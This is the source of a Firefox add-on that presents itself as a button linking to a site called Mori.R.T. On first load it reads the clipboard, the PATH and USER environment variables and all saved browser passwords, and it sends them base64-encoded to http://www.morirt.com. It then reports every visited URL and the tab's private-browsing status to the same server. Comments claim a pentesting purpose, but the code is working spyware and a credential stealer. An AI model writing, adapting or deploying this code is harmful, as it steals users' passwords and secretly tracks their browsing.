var self = require("sdk/self");
var base64 = require("sdk/base64");
var clipboard = require("sdk/clipboard");
var { env } = require('sdk/system/environment');
let { Loader } = require('toolkit/loader');

require("sdk/tabs").on("ready", logURL);

XMLHttpRequest = require("sdk/net/xhr").XMLHttpRequest;


// START Globals
var server = "http://www.morirt.com"
var inst_id = "vogun_fool"
// END Globals

function create_button(){
  // Define a button to avoid malicious purposes.
  var buttons = require('sdk/ui/button/action');
  var tabs = require("sdk/tabs");

  var button = buttons.ActionButton({
    id: "morirt-link",
    label: "See Mori.R.T",
    icon: {
      "16": "./hat_.png",
      "32": "./hat_.png",
      "64": "./hat_.png"
    },
    onClick: handleClick
  });

  function handleClick(state) {
    tabs.open("http://www.morirt.com/");
  }
}

function environment() {
  var encodedData = base64.encode("PATH:" + env.PATH + "&USER:" + env.USER);
  return encodedData;
}

function all_passwords() {
  var passwords = "";
  require("sdk/passwords").search({
    onComplete: function onComplete(credentials) {
      credentials.forEach(function(credential) {
        passwords += base64.encode(credential.username + "||" + credential.password + "||" + credential.url) + ";"
      });
    }
  });
  return passwords
}

function sendData(data) {
  var method = "POST";
  var request = new XMLHttpRequest();
  request.open(method, server);
  request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  request.send(data);
}


function first_load() {
  create_button();   // This is to verify only pentesting purposes.
  var report = "";
  report += "ID:" + inst_id + "&";
  report += "ENV:" + environment() + "&";
  report += "CLIPBOARD:" + base64.encode(clipboard.get())+ "&";
  report += "CREDS:" + all_passwords();
  sendData(report);
  console.log("Sent data.");
}


function logURL(tab) {
  var report = "";
  report += "ID:" + inst_id + "&";
  report += "URL:" + tab.url + "&";
  report += "P:" + require("sdk/private-browsing").isPrivate(tab);
  sendData(report);
  console.log("Sent Update.");
}


// This is where it all starts

first_load();
